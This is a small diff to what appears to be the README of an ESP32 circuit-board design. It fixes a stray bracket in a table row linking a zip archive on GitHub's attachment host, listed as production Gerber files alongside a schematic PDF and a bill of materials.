@@ -45,7 +45,7 @@ The design includes 5 functional blocks:
 
 | File | Description |
 |------|-------------|
-| `[https://github.com/user-attachments/files/27808006/esp.32.smaller.zip` | Production-ready Gerber files |
+| `https://github.com/user-attachments/files/27808006/esp.32.smaller.zip` | Production-ready Gerber files |
 | `schematic.pdf` | Full schematic export |
 | `bom.csv` | Bill of materials |
 
